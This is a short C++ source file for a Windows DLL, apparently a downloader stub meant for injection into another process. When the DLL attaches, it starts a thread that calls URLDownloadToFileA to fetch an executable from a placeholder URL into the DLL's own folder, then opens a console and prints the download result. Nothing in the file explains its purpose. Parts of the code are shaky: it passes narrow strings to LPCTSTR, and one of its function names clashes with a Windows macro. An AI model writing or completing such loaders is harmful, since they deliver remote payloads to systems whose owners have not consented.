#include <tchar.h>
#include <urlmon.h> 
#include <string>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")


std::string GetCurrentDirectory()
{
    char buffer[MAX_PATH] = {};
    DWORD size = GetModuleFileNameA(NULL, buffer, MAX_PATH);
    if (size == 0 || size == MAX_PATH) return "";
    std::string fileName(buffer, size);
    std::string::size_type pos = fileName.find_last_of("\\/");
    return fileName.substr(0, pos + 1);
}

void MainThread() {

    HRESULT download;
    LPCTSTR downloadUrl = "sito + nome.exe", File = "nomexe.exe";
    std::string localFile = GetCurrentDirectory() + File;

    download = URLDownloadToFileA(0, downloadUrl, localFile.c_str(), 0, 0);

    AllocConsole(); freopen("CONOUT$", "w", stdout);

    std::cout << "Hello :D" << std::endl;

    switch (download)
    {
    case S_OK:
        std::cout << "1" << std::endl;
        break;
    case E_OUTOFMEMORY:
        std::cout << "Out of mem" << std::endl;
        break;
    case INET_E_DOWNLOAD_FAILURE:
        std::cout << "0" << std::endl;
        break;
    default:
        std::cout << " " << std::endl;
        break;
    }

}



BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(MainThread), nullptr, NULL, nullptr);
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
